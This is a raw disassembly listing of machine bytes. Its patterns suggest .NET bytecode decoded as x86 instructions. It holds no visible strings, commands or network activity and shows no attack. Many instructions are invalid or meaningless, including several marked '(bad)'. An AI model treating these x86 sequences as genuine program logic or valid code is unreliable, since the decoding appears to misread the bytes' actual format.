  4030f9:	05 02 28 10 00       	add    $0x102802,%eax
  4030fe:	00 2b                	add    %ch,(%ebx)
  403100:	dd ca                	(bad)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 02                	add    %al,(%edx)
  403106:	7b 20                	jnp    0x403128
  403108:	00 00                	add    %al,(%eax)
  40310a:	04 13                	add    $0x13,%al
  40310c:	05 02 7c 20 00       	add    $0x207c02,%eax
  403111:	00 04 fe             	add    %al,(%esi,%edi,8)
  403114:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  403119:	02 15 25 0a 7d 1b    	add    0x1b7d0a25,%dl
  40311f:	00 00                	add    %al,(%eax)
  403121:	04 12                	add    $0x12,%al
  403123:	05 28 2d 00 00       	add    $0x2d28,%eax
  403128:	0a 26                	or     (%esi),%ah
  40312a:	2b 75 02             	sub    0x2(%ebp),%esi
  40312d:	7b 1e                	jnp    0x40314d
  40312f:	00 00                	add    %al,(%eax)
  403131:	04 28                	add    $0x28,%al
  403133:	27                   	daa
  403134:	00 00                	add    %al,(%eax)
  403136:	0a 7e 9a             	or     -0x66(%esi),%bh
  403139:	00 00                	add    %al,(%eax)
  40313b:	04 6f                	add    $0x6f,%al
  40313d:	59                   	pop    %ecx
  40313e:	00 00                	add    %al,(%eax)
  403140:	0a 6f 3b             	or     0x3b(%edi),%ch
  403143:	00 00                	add    %al,(%eax)
  403145:	0a 6f 32             	or     0x32(%edi),%ch
  403148:	00 00                	add    %al,(%eax)
  40314a:	06                   	push   %es
  40314b:	6f                   	outsl  %ds:(%esi),(%dx)
  40314c:	2b 00                	sub    (%eax),%eax
  40314e:	00 0a                	add    %cl,(%edx)
  403150:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  403156:	00 00                	add    %al,(%eax)
  403158:	0a 2d 3e 02 18 25    	or     0x2518023e,%ch
  40315e:	0a 7d 1b             	or     0x1b(%ebp),%bh
  403161:	00 00                	add    %al,(%eax)
  403163:	04 02                	add    $0x2,%al
  403165:	11 05 7d 20 00 00    	adc    %eax,0x207d
  40316b:	04 02                	add    $0x2,%al
  40316d:	7c 1c                	jl     0x40318b
  40316f:	00 00                	add    %al,(%eax)
  403171:	04 12                	add    $0x12,%al
  403173:	05 02 28 10 00       	add    $0x102802,%eax
  403178:	00 2b                	add    %ch,(%ebx)
  40317a:	de 53 02             	ficoms 0x2(%ebx)
  40317d:	7b 20                	jnp    0x40319f
  40317f:	00 00                	add    %al,(%eax)
  403181:	04 13                	add    $0x13,%al
  403183:	05 02 7c 20 00       	add    $0x207c02,%eax
  403188:	00 04 fe             	add    %al,(%esi,%edi,8)
  40318b:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  403190:	02 15 25 0a 7d 1b    	add    0x1b7d0a25,%dl
  403196:	00 00                	add    %al,(%eax)
  403198:	04 12                	add    $0x12,%al
  40319a:	05 28 2d 00 00       	add    $0x2d28,%eax
  40319f:	0a 26                	or     (%esi),%ah
  4031a1:	de 19                	ficomps (%ecx)
  4031a3:	13 06                	adc    (%esi),%eax
  4031a5:	02 1f                	add    (%edi),%bl
  4031a7:	fe                   	(bad)
  4031a8:	7d 1b                	jge    0x4031c5
  4031aa:	00 00                	add    %al,(%eax)
  4031ac:	04 02                	add    $0x2,%al
  4031ae:	7c 1c                	jl     0x4031cc
  4031b0:	00 00                	add    %al,(%eax)
  4031b2:	04 11                	add    $0x11,%al
  4031b4:	06                   	push   %es
  4031b5:	28 3d 00 00 0a de    	sub    %bh,0xde0a0000
  4031bb:	13 02                	adc    (%edx),%eax
  4031bd:	1f                   	pop    %ds
  4031be:	fe                   	(bad)
  4031bf:	7d 1b                	jge    0x4031dc
  4031c1:	00 00                	add    %al,(%eax)
  4031c3:	04 02                	add    $0x2,%al
  4031c5:	7c 1c                	jl     0x4031e3
  4031c7:	00 00                	add    %al,(%eax)
  4031c9:	04 28                	add    $0x28,%al
  4031cb:	3e 00 00             	add    %al,%ds:(%eax)
  4031ce:	0a 2a                	or     (%edx),%ch
  4031d0:	41                   	inc    %ecx
  4031d1:	1c 00                	sbb    $0x0,%al
  4031d3:	00 00                	add    %al,(%eax)
  4031d5:	00 00                	add    %al,(%eax)
  4031d7:	00 0e                	add    %cl,(%esi)
  4031d9:	00 00                	add    %al,(%eax)
  4031db:	00 f5                	add    %dh,%ch
  4031dd:	01 00                	add    %eax,(%eax)
  4031df:	00 03                	add    %al,(%ebx)
  4031e1:	02 00                	add    (%eax),%al
  4031e3:	00 19                	add    %bl,(%ecx)
  4031e5:	00 00                	add    %al,(%eax)
  4031e7:	00 0b                	add    %cl,(%ebx)
  4031e9:	00 00                	add    %al,(%eax)
  4031eb:	01 1b                	add    %ebx,(%ebx)
  4031ed:	30 04 00             	xor    %al,(%eax,%eax,1)
  4031f0:	4b                   	dec    %ebx
  4031f1:	01 00                	add    %eax,(%eax)
  4031f3:	00 10                	add    %dl,(%eax)
  4031f5:	00 00                	add    %al,(%eax)
  4031f7:	11 02                	adc    %eax,(%edx)
  4031f9:	7b 21                	jnp    0x40321c
  4031fb:	00 00                	add    %al,(%eax)
  4031fd:	04 0a                	add    $0xa,%al
  4031ff:	06                   	push   %es
  403200:	39 ea                	cmp    %ebp,%edx
  403202:	00 00                	add    %al,(%eax)
  403204:	00 02                	add    %al,(%edx)
  403206:	7b 23                	jnp    0x40322b
  403208:	00 00                	add    %al,(%eax)
  40320a:	04 7b                	add    $0x7b,%al
  40320c:	4b                   	dec    %ebx
  40320d:	00 00                	add    %al,(%eax)
  40320f:	04 2c                	add    $0x2c,%al
  403211:	05 dd 18 01 00       	add    $0x118dd,%eax
  403216:	00 72 89             	add    %dh,-0x77(%edx)
  403219:	00 00                	add    %al,(%eax)
  40321b:	70 0b                	jo     0x403228
  40321d:	1d 8d 34 00 00       	sbb    $0x348d,%eax
  403222:	01 25 16 28 73 00    	add    %esp,0x732816
  403228:	00 06                	add    %al,(%esi)
  40322a:	a2 25 17 28 5a       	mov    %al,0x5a281725
  40322f:	00 00                	add    %al,(%eax)
  403231:	0a a2 25 18 28 5b    	or     0x5b281825(%edx),%ah
  403237:	00 00                	add    %al,(%eax)
  403239:	0a 6f 5c             	or     0x5c(%edi),%ch
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a a2 25 19 07 a2    	or     -0x5df8e6db(%edx),%ah
  403244:	25 1a 28 72 00       	and    $0x72281a,%eax
  403249:	00 06                	add    %al,(%esi)
  40324b:	a2 25 1b 28 71       	mov    %al,0x71281b25
  403250:	00 00                	add    %al,(%eax)
  403252:	06                   	push   %es
  403253:	a2 25 1c 28 70       	mov    %al,0x70281c25
  403258:	00 00                	add    %al,(%eax)
  40325a:	06                   	push   %es
  40325b:	13 05 12 05 28 5d    	adc    0x5d280512,%eax
  403261:	00 00                	add    %al,(%eax)
  403263:	0a a2 0c 16 8d 2e    	or     0x2e8d160c(%edx),%ah
  403269:	00 00                	add    %al,(%eax)
  40326b:	01 0d 17 8d 2e 00    	add    %ecx,0x2e8d17
  403271:	00 01                	add    %al,(%ecx)
  403273:	13 04 16             	adc    (%esi,%edx,1),%eax
  403276:	13 06                	adc    (%esi),%eax
  403278:	2b 31                	sub    (%ecx),%esi
  40327a:	28 27                	sub    %ah,(%edi)
  40327c:	00 00                	add    %al,(%eax)
  40327e:	0a 08                	or     (%eax),%cl
  403280:	11 06                	adc    %eax,(%esi)
  403282:	9a 6f 3b 00 00 0a 13 	lcall  $0x130a,$0x3b6f
  403289:	07                   	pop    %es
  40328a:	09 11                	or     %edx,(%ecx)
  40328c:	07                   	pop    %es
  40328d:	28 45 00             	sub    %al,0x0(%ebp)
  403290:	00 06                	add    %al,(%esi)
  403292:	0d 11 06 08 8e       	or     $0x8e080611,%eax
  403297:	69 17 59 2e 09 09    	imul   $0x9092e59,(%edi),%edx
  40329d:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  4032a0:	45                   	inc    %ebp
  4032a1:	00 00                	add    %al,(%eax)
  4032a3:	06                   	push   %es
  4032a4:	0d 11 06 17 58       	or     $0x58170611,%eax
  4032a9:	13 06                	adc    (%esi),%eax
  4032ab:	11 06                	adc    %eax,(%esi)
  4032ad:	08 8e 69 32 c8 02    	or     %cl,0x2c83269(%esi)
  4032b3:	7b 23                	jnp    0x4032d8
  4032b5:	00 00                	add    %al,(%eax)
  4032b7:	04 09                	add    $0x9,%al
  4032b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4032ba:	32 00                	xor    (%eax),%al
  4032bc:	00 06                	add    %al,(%esi)
  4032be:	6f                   	outsl  %ds:(%esi),(%dx)
  4032bf:	2b 00                	sub    (%eax),%eax
  4032c1:	00 0a                	add    %cl,(%edx)
  4032c3:	13 08                	adc    (%eax),%ecx
  4032c5:	12 08                	adc    (%eax),%cl
  4032c7:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4032ca:	00 0a                	add    %cl,(%edx)
  4032cc:	2d 3e 02 16 25       	sub    $0x2516023e,%eax
  4032d1:	0a 7d 21             	or     0x21(%ebp),%bh
  4032d4:	00 00                	add    %al,(%eax)
  4032d6:	04 02                	add    $0x2,%al
  4032d8:	11 08                	adc    %ecx,(%eax)
  4032da:	7d 24                	jge    0x403300
  4032dc:	00 00                	add    %al,(%eax)
  4032de:	04 02                	add    $0x2,%al
  4032e0:	7c 22                	jl     0x403304
  4032e2:	00 00                	add    %al,(%eax)
  4032e4:	04 12                	add    $0x12,%al
  4032e6:	08 02                	or     %al,(%edx)
  4032e8:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4032eb:	00 2b                	add    %ch,(%ebx)
  4032ed:	de 53 02             	ficoms 0x2(%ebx)
  4032f0:	7b 24                	jnp    0x403316
  4032f2:	00 00                	add    %al,(%eax)
  4032f4:	04 13                	add    $0x13,%al
  4032f6:	08 02                	or     %al,(%edx)
  4032f8:	7c 24                	jl     0x40331e
  4032fa:	00 00                	add    %al,(%eax)
  4032fc:	04 fe                	add    $0xfe,%al
  4032fe:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  403303:	02 15 25 0a 7d 21    	add    0x217d0a25,%dl
  403309:	00 00                	add    %al,(%eax)
  40330b:	04 12                	add    $0x12,%al
  40330d:	08 28                	or     %ch,(%eax)
  40330f:	2d 00 00 0a 26       	sub    $0x260a0000,%eax
  403314:	de 19                	ficomps (%ecx)
  403316:	13 09                	adc    (%ecx),%ecx
  403318:	02 1f                	add    (%edi),%bl
  40331a:	fe                   	(bad)
  40331b:	7d 21                	jge    0x40333e
  40331d:	00 00                	add    %al,(%eax)
  40331f:	04 02                	add    $0x2,%al
  403321:	7c 22                	jl     0x403345
  403323:	00 00                	add    %al,(%eax)
  403325:	04 11                	add    $0x11,%al
  403327:	09 28                	or     %ebp,(%eax)
  403329:	3d 00 00 0a de       	cmp    $0xde0a0000,%eax
  40332e:	13 02                	adc    (%edx),%eax
  403330:	1f                   	pop    %ds
  403331:	fe                   	(bad)
  403332:	7d 21                	jge    0x403355
  403334:	00 00                	add    %al,(%eax)
  403336:	04 02                	add    $0x2,%al
  403338:	7c 22                	jl     0x40335c
  40333a:	00 00                	add    %al,(%eax)
  40333c:	04 28                	add    $0x28,%al
  40333e:	3e 00 00             	add    %al,%ds:(%eax)
  403341:	0a 2a                	or     (%edx),%ch
  403343:	00 41 1c             	add    %al,0x1c(%ecx)
  403346:	00 00                	add    %al,(%eax)
  403348:	00 00                	add    %al,(%eax)
  40334a:	00 00                	add    %al,(%eax)
  40334c:	07                   	pop    %es
  40334d:	00 00                	add    %al,(%eax)
  40334f:	00 17                	add    %dl,(%edi)
  403351:	01 00                	add    %eax,(%eax)
  403353:	00 1e                	add    %bl,(%esi)
  403355:	01 00                	add    %eax,(%eax)
  403357:	00 19                	add    %bl,(%ecx)
  403359:	00 00                	add    %al,(%eax)
  40335b:	00 0b                	add    %cl,(%ebx)
  40335d:	00 00                	add    %al,(%eax)
  40335f:	01 1b                	add    %ebx,(%ebx)
  403361:	30 03                	xor    %al,(%ebx)
  403363:	00 aa 01 00 00 11    	add    %ch,0x11000001(%edx)
  403369:	00 00                	add    %al,(%eax)
  40336b:	11 02                	adc    %eax,(%edx)
  40336d:	7b 25                	jnp    0x403394
  40336f:	00 00                	add    %al,(%eax)
  403371:	04 0a                	add    $0xa,%al
  403373:	06                   	push   %es
  403374:	45                   	inc    %ebp
  403375:	03 00                	add    (%eax),%eax
  403377:	00 00                	add    %al,(%eax)
  403379:	39 00                	cmp    %eax,(%eax)
  40337b:	00 00                	add    %al,(%eax)
  40337d:	a0 00 00 00 2f       	mov    0x2f000000,%al
  403382:	01 00                	add    %eax,(%eax)
  403384:	00 28                	add    %ch,(%eax)
  403386:	6e                   	outsb  %ds:(%esi),(%dx)
  403387:	00 00                	add    %al,(%eax)
  403389:	06                   	push   %es
  40338a:	6f                   	outsl  %ds:(%esi),(%dx)
  40338b:	5e                   	pop    %esi
  40338c:	00 00                	add    %al,(%eax)
  40338e:	0a 13                	or     (%ebx),%dl
  403390:	05 12 05 28 5f       	add    $0x5f280512,%eax
  403395:	00 00                	add    %al,(%eax)
  403397:	0a 2d 41 02 16 25    	or     0x25160241,%ch
  40339d:	0a 7d 25             	or     0x25(%ebp),%bh
  4033a0:	00 00                	add    %al,(%eax)
  4033a2:	04 02                	add    $0x2,%al
  4033a4:	11 05 7d 29 00 00    	adc    %eax,0x297d
  4033aa:	04 02                	add    $0x2,%al
  4033ac:	7c 26                	jl     0x4033d4
  4033ae:	00 00                	add    %al,(%eax)
  4033b0:	04 12                	add    $0x12,%al
  4033b2:	05 02 28 15 00       	add    $0x152802,%eax
  4033b7:	00 2b                	add    %ch,(%ebx)
  4033b9:	dd 57 01             	fstl   0x1(%edi)
  4033bc:	00 00                	add    %al,(%eax)
  4033be:	02 7b 29             	add    0x29(%ebx),%bh
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	04 13                	add    $0x13,%al
  4033c5:	05 02 7c 29 00       	add    $0x297c02,%eax
  4033ca:	00 04 fe             	add    %al,(%esi,%edi,8)
  4033cd:	15 0a 00 00 1b       	adc    $0x1b00000a,%eax
  4033d2:	02 15 25 0a 7d 25    	add    0x257d0a25,%dl
  4033d8:	00 00                	add    %al,(%eax)
  4033da:	04 12                	add    $0x12,%al
  4033dc:	05 28 60 00 00       	add    $0x6028,%eax
  4033e1:	0a 13                	or     (%ebx),%dl
  4033e3:	04 02                	add    $0x2,%al
  4033e5:	11 04 7d 28 00 00 04 	adc    %eax,0x4000028(,%edi,2)
  4033ec:	28 7a 00             	sub    %bh,0x0(%edx)
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4033f2:	61                   	popa
  4033f3:	00 00                	add    %al,(%eax)
  4033f5:	0a 13                	or     (%ebx),%dl
  4033f7:	06                   	push   %es
  4033f8:	12 06                	adc    (%esi),%al
  4033fa:	28 62 00             	sub    %ah,0x0(%edx)
  4033fd:	00 0a                	add    %cl,(%edx)
  4033ff:	2d 41 02 17 25       	sub    $0x25170241,%eax
  403404:	0a 7d 25             	or     0x25(%ebp),%bh
  403407:	00 00                	add    %al,(%eax)
  403409:	04 02                	add    $0x2,%al
  40340b:	11 06                	adc    %eax,(%esi)
  40340d:	7d 2a                	jge    0x403439
  40340f:	00 00                	add    %al,(%eax)
  403411:	04 02                	add    $0x2,%al
  403413:	7c 26                	jl     0x40343b
  403415:	00 00                	add    %al,(%eax)
  403417:	04 12                	add    $0x12,%al
  403419:	06                   	push   %es
  40341a:	02 28                	add    (%eax),%ch
  40341c:	16                   	push   %ss
  40341d:	00 00                	add    %al,(%eax)
  40341f:	2b dd                	sub    %ebp,%ebx
  403421:	f0 00 00             	lock add %al,(%eax)
  403424:	00 02                	add    %al,(%edx)
  403426:	7b 2a                	jnp    0x403452
  403428:	00 00                	add    %al,(%eax)
  40342a:	04 13                	add    $0x13,%al
  40342c:	06                   	push   %es
  40342d:	02 7c 2a 00          	add    0x0(%edx,%ebp,1),%bh
  403431:	00 04 fe             	add    %al,(%esi,%edi,8)
  403434:	15 0c 00 00 1b       	adc    $0x1b00000c,%eax
  403439:	02 15 25 0a 7d 25    	add    0x257d0a25,%dl
  40343f:	00 00                	add    %al,(%eax)
  403441:	04 12                	add    $0x12,%al
  403443:	06                   	push   %es
  403444:	28 63 00             	sub    %ah,0x0(%ebx)
  403447:	00 0a                	add    %cl,(%edx)
  403449:	20 e8                	and    %ch,%al
  40344b:	03 00                	add    (%eax),%eax
  40344d:	00 5c 13 07          	add    %bl,0x7(%ebx,%edx,1)
  403451:	12 07                	adc    (%edi),%al
  403453:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  403457:	0a 0b                	or     (%ebx),%cl
  403459:	02 7b 28             	add    0x28(%ebx),%bh
  40345c:	00 00                	add    %al,(%eax)
  40345e:	04 72                	add    $0x72,%al
  403460:	85 00                	test   %eax,(%eax)
  403462:	00 70 07             	add    %dh,0x7(%eax)
  403465:	28 65 00             	sub    %ah,0x0(%ebp)
  403468:	00 0a                	add    %cl,(%edx)
  40346a:	0c 28                	or     $0x28,%al
  40346c:	27                   	daa
  40346d:	00 00                	add    %al,(%eax)
  40346f:	0a 08                	or     (%eax),%cl
  403471:	6f                   	outsl  %ds:(%esi),(%dx)
  403472:	3b 00                	cmp    (%eax),%eax
  403474:	00 0a                	add    %cl,(%edx)
  403476:	0d 02 7b 27 00       	or     $0x277b02,%eax
  40347b:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40347e:	6f                   	outsl  %ds:(%esi),(%dx)
  40347f:	32 00                	xor    (%eax),%al
  403481:	00 06                	add    %al,(%esi)
  403483:	6f                   	outsl  %ds:(%esi),(%dx)
  403484:	2b 00                	sub    (%eax),%eax
  403486:	00 0a                	add    %cl,(%edx)
  403488:	13 08                	adc    (%eax),%ecx
  40348a:	12 08                	adc    (%eax),%cl
  40348c:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  40348f:	00 0a                	add    %cl,(%edx)
  403491:	2d 3e 02 18 25       	sub    $0x2518023e,%eax
  403496:	0a 7d 25             	or     0x25(%ebp),%bh
  403499:	00 00                	add    %al,(%eax)
  40349b:	04 02                	add    $0x2,%al
  40349d:	11 08                	adc    %ecx,(%eax)
  40349f:	7d 2b                	jge    0x4034cc
  4034a1:	00 00                	add    %al,(%eax)
  4034a3:	04 02                	add    $0x2,%al
  4034a5:	7c 26                	jl     0x4034cd
  4034a7:	00 00                	add    %al,(%eax)
  4034a9:	04 12                	add    $0x12,%al
  4034ab:	08 02                	or     %al,(%edx)
  4034ad:	28 17                	sub    %dl,(%edi)
  4034af:	00 00                	add    %al,(%eax)
  4034b1:	2b de                	sub    %esi,%ebx
  4034b3:	61                   	popa
  4034b4:	02 7b 2b             	add    0x2b(%ebx),%bh
  4034b7:	00 00                	add    %al,(%eax)
  4034b9:	04 13                	add    $0x13,%al
  4034bb:	08 02                	or     %al,(%edx)
  4034bd:	7c 2b                	jl     0x4034ea
  4034bf:	00 00                	add    %al,(%eax)
  4034c1:	04 fe                	add    $0xfe,%al
  4034c3:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  4034c8:	02 15 25 0a 7d 25    	add    0x257d0a25,%dl
  4034ce:	00 00                	add    %al,(%eax)
  4034d0:	04 12                	add    $0x12,%al
  4034d2:	08 28                	or     %ch,(%eax)
  4034d4:	2d 00 00 0a 26       	sub    $0x260a0000,%eax
  4034d9:	de 20                	fisubs (%eax)
  4034db:	13 09                	adc    (%ecx),%ecx
  4034dd:	02 1f                	add    (%edi),%bl
  4034df:	fe                   	(bad)
  4034e0:	7d 25                	jge    0x403507
  4034e2:	00 00                	add    %al,(%eax)
  4034e4:	04 02                	add    $0x2,%al
  4034e6:	14 7d                	adc    $0x7d,%al
  4034e8:	28 00                	sub    %al,(%eax)
  4034ea:	00 04 02             	add    %al,(%edx,%eax,1)
  4034ed:	7c 26                	jl     0x403515
  4034ef:	00 00                	add    %al,(%eax)
  4034f1:	04 11                	add    $0x11,%al
  4034f3:	09 28                	or     %ebp,(%eax)
  4034f5:	3d 00 00 0a de       	cmp    $0xde0a0000,%eax
  4034fa:	1a 02                	sbb    (%edx),%al
  4034fc:	1f                   	pop    %ds
  4034fd:	fe                   	(bad)
  4034fe:	7d 25                	jge    0x403525
  403500:	00 00                	add    %al,(%eax)
  403502:	04 02                	add    $0x2,%al
  403504:	14 7d                	adc    $0x7d,%al
  403506:	28 00                	sub    %al,(%eax)
  403508:	00 04 02             	add    %al,(%edx,%eax,1)
  40350b:	7c 26                	jl     0x403533
  40350d:	00 00                	add    %al,(%eax)
  40350f:	04 28                	add    $0x28,%al
  403511:	3e 00 00             	add    %al,%ds:(%eax)
  403514:	0a 2a                	or     (%edx),%ch
  403516:	00 00                	add    %al,(%eax)
  403518:	41                   	inc    %ecx
  403519:	1c 00                	sbb    $0x0,%al
  40351b:	00 00                	add    %al,(%eax)
  40351d:	00 00                	add    %al,(%eax)
  40351f:	00 07                	add    %al,(%edi)
  403521:	00 00                	add    %al,(%eax)
  403523:	00 68 01             	add    %ch,0x1(%eax)
  403526:	00 00                	add    %al,(%eax)
  403528:	6f                   	outsl  %ds:(%esi),(%dx)
  403529:	01 00                	add    %eax,(%eax)
  40352b:	00 20                	add    %ah,(%eax)
  40352d:	00 00                	add    %al,(%eax)
  40352f:	00 0b                	add    %cl,(%ebx)
  403531:	00 00                	add    %al,(%eax)
  403533:	01 1b                	add    %ebx,(%ebx)
  403535:	30 03                	xor    %al,(%ebx)
  403537:	00 f4                	add    %dh,%ah
  403539:	01 00                	add    %eax,(%eax)
  40353b:	00 12                	add    %dl,(%edx)
  40353d:	00 00                	add    %al,(%eax)
  40353f:	11 02                	adc    %eax,(%edx)
  403541:	7b 2c                	jnp    0x40356f
  403543:	00 00                	add    %al,(%eax)
  403545:	04 0a                	add    $0xa,%al
  403547:	02 7b 2e             	add    0x2e(%ebx),%bh
  40354a:	00 00                	add    %al,(%eax)
  40354c:	04 0b                	add    $0xb,%al
  40354e:	06                   	push   %es
  40354f:	45                   	inc    %ebp
  403550:	03 00                	add    (%eax),%eax
  403552:	00 00                	add    %al,(%eax)
  403554:	44                   	inc    %esp
  403555:	00 00                	add    %al,(%eax)
  403557:	00 df                	add    %bl,%bh
  403559:	00 00                	add    %al,(%eax)
  40355b:	00 66 01             	add    %ah,0x1(%esi)
  40355e:	00 00                	add    %al,(%eax)
  403560:	38 85 01 00 00 07    	cmp    %al,0x7000001(%ebp)
  403566:	7b 13                	jnp    0x40357b
  403568:	00 00                	add    %al,(%eax)
  40356a:	04 6f                	add    $0x6f,%al
  40356c:	31 00                	xor    %eax,(%eax)
  40356e:	00 06                	add    %al,(%esi)
  403570:	6f                   	outsl  %ds:(%esi),(%dx)
  403571:	23 00                	and    (%eax),%eax
  403573:	00 0a                	add    %cl,(%edx)
  403575:	13 04 12             	adc    (%edx,%edx,1),%eax
  403578:	04 28                	add    $0x28,%al
  40357a:	24 00                	and    $0x0,%al
  40357c:	00 0a                	add    %cl,(%edx)
  40357e:	2d 41 02 16 25       	sub    $0x25160241,%eax
  403583:	0a 7d 2c             	or     0x2c(%ebp),%bh
  403586:	00 00                	add    %al,(%eax)
  403588:	04 02                	add    $0x2,%al
  40358a:	11 04 7d 2f 00 00 04 	adc    %eax,0x400002f(,%edi,2)
  403591:	02 7c 2d 00          	add    0x0(%ebp,%ebp,1),%bh
  403595:	00 04 12             	add    %al,(%edx,%edx,1)
  403598:	04 02                	add    $0x2,%al
  40359a:	28 18                	sub    %bl,(%eax)
  40359c:	00 00                	add    %al,(%eax)
  40359e:	2b dd                	sub    %ebp,%ebx
  4035a0:	8f 01                	pop    (%ecx)
  4035a2:	00 00                	add    %al,(%eax)
  4035a4:	02 7b 2f             	add    0x2f(%ebx),%bh
  4035a7:	00 00                	add    %al,(%eax)
  4035a9:	04 13                	add    $0x13,%al
  4035ab:	04 02                	add    $0x2,%al
  4035ad:	7c 2f                	jl     0x4035de
  4035af:	00 00                	add    %al,(%eax)
  4035b1:	04 fe                	add    $0xfe,%al
  4035b3:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  4035b8:	02 15 25 0a 7d 2c    	add    0x2c7d0a25,%dl
  4035be:	00 00                	add    %al,(%eax)
  4035c0:	04 12                	add    $0x12,%al
  4035c2:	04 28                	add    $0x28,%al
  4035c4:	26 00 00             	add    %al,%es:(%eax)
  4035c7:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4035ca:	39 2b                	cmp    %ebp,(%ebx)
  4035cc:	01 00                	add    %eax,(%eax)
  4035ce:	00 08                	add    %cl,(%eax)
  4035d0:	16                   	push   %ss
  4035d1:	91                   	xchg   %eax,%ecx
  4035d2:	0d 09 45 05 00       	or     $0x54509,%eax
  4035d7:	00 00                	add    %al,(%eax)
  4035d9:	05 00 00 00 12       	add    $0x12000000,%eax
  4035de:	00 00                	add    %al,(%eax)
  4035e0:	00 7b 00             	add    %bh,0x0(%ebx)
  4035e3:	00 00                	add    %al,(%eax)
  4035e5:	87 00                	xchg   %eax,(%eax)
  4035e7:	00 00                	add    %al,(%eax)
  4035e9:	a3 00 00 00 38       	mov    %eax,0x38000000
  4035ee:	f8                   	clc
  4035ef:	00 00                	add    %al,(%eax)
  4035f1:	00 07                	add    %al,(%edi)
  4035f3:	08 28                	or     %ch,(%eax)
  4035f5:	12 00                	adc    (%eax),%al
  4035f7:	00 06                	add    %al,(%esi)
  4035f9:	26 38 eb             	es cmp %ch,%bl
  4035fc:	00 00                	add    %al,(%eax)
  4035fe:	00 07                	add    %al,(%edi)
  403600:	07                   	pop    %es
  403601:	7b 13                	jnp    0x403616
  403603:	00 00                	add    %al,(%eax)
  403605:	04 28                	add    $0x28,%al
  403607:	14 00                	adc    $0x0,%al
  403609:	00 06                	add    %al,(%esi)
  40360b:	6f                   	outsl  %ds:(%esi),(%dx)
  40360c:	37                   	aaa
  40360d:	00 00                	add    %al,(%eax)
  40360f:	0a 13                	or     (%ebx),%dl
  403611:	05 12 05 28 38       	add    $0x38280512,%eax
  403616:	00 00                	add    %al,(%eax)
  403618:	0a 2d 41 02 17 25    	or     0x25170241,%ch
  40361e:	0a 7d 2c             	or     0x2c(%ebp),%bh
  403621:	00 00                	add    %al,(%eax)
  403623:	04 02                	add    $0x2,%al
  403625:	11 05 7d 30 00 00    	adc    %eax,0x307d
  40362b:	04 02                	add    $0x2,%al
  40362d:	7c 2d                	jl     0x40365c
  40362f:	00 00                	add    %al,(%eax)
  403631:	04 12                	add    $0x12,%al
  403633:	05 02 28 19 00       	add    $0x192802,%eax
  403638:	00 2b                	add    %ch,(%ebx)
  40363a:	dd f4                	(bad)
  40363c:	00 00                	add    %al,(%eax)
  40363e:	00 02                	add    %al,(%edx)
  403640:	7b 30                	jnp    0x403672
  403642:	00 00                	add    %al,(%eax)
  403644:	04 13                	add    $0x13,%al
  403646:	05 02 7c 30 00       	add    $0x307c02,%eax
  40364b:	00 04 fe             	add    %al,(%esi,%edi,8)
  40364e:	15 0a 00 00 01       	adc    $0x100000a,%eax
  403653:	02 15 25 0a 7d 2c    	add    0x2c7d0a25,%dl
  403659:	00 00                	add    %al,(%eax)
  40365b:	04 12                	add    $0x12,%al
  40365d:	05 28 39 00 00       	add    $0x3928,%eax
  403662:	0a 38                	or     (%eax),%bh
  403664:	82 00 00             	addb   $0x0,(%eax)
  403667:	00 28                	add    %ch,(%eax)
  403669:	66 00 00             	data16 add %al,(%eax)
  40366c:	0a 6f 67             	or     0x67(%edi),%ch
  40366f:	00 00                	add    %al,(%eax)
  403671:	0a 2b                	or     (%ebx),%ch
  403673:	76 28                	jbe    0x40369d
  403675:	68 00 00 0a 6f       	push   $0x6f0a0000
  40367a:	69 00 00 0a 28 6a    	imul   $0x6a280a00,(%eax),%eax
  403680:	00 00                	add    %al,(%eax)
  403682:	0a 26                	or     (%esi),%ah
  403684:	28 66 00             	sub    %ah,0x0(%esi)
  403687:	00 0a                	add    %cl,(%edx)
  403689:	6f                   	outsl  %ds:(%esi),(%dx)
  40368a:	67 00 00             	add    %al,(%bx,%si)
  40368d:	0a 2b                	or     (%ebx),%ch
  40368f:	5a                   	pop    %edx
  403690:	28 77 00             	sub    %dh,0x0(%edi)
  403693:	00 06                	add    %al,(%esi)
  403695:	6f                   	outsl  %ds:(%esi),(%dx)
  403696:	37                   	aaa
  403697:	00 00                	add    %al,(%eax)
  403699:	0a 13                	or     (%ebx),%dl
  40369b:	05 12 05 28 38       	add    $0x38280512,%eax
  4036a0:	00 00                	add    %al,(%eax)
  4036a2:	0a 2d 3e 02 18 25    	or     0x2518023e,%ch
  4036a8:	0a 7d 2c             	or     0x2c(%ebp),%bh
  4036ab:	00 00                	add    %al,(%eax)
  4036ad:	04 02                	add    $0x2,%al
  4036af:	11 05 7d 30 00 00    	adc    %eax,0x307d
  4036b5:	04 02                	add    $0x2,%al
  4036b7:	7c 2d                	jl     0x4036e6
  4036b9:	00 00                	add    %al,(%eax)
  4036bb:	04 12                	add    $0x12,%al
  4036bd:	05 02 28 19 00       	add    $0x192802,%eax
  4036c2:	00 2b                	add    %ch,(%ebx)
  4036c4:	de 6d 02             	fisubrs 0x2(%ebp)
  4036c7:	7b 30                	jnp    0x4036f9
  4036c9:	00 00                	add    %al,(%eax)
  4036cb:	04 13                	add    $0x13,%al
  4036cd:	05 02 7c 30 00       	add    $0x307c02,%eax
  4036d2:	00 04 fe             	add    %al,(%esi,%edi,8)
  4036d5:	15 0a 00 00 01       	adc    $0x100000a,%eax
  4036da:	02 15 25 0a 7d 2c    	add    0x2c7d0a25,%dl
  4036e0:	00 00                	add    %al,(%eax)
  4036e2:	04 12                	add    $0x12,%al
  4036e4:	05 28 39 00 00       	add    $0x3928,%eax
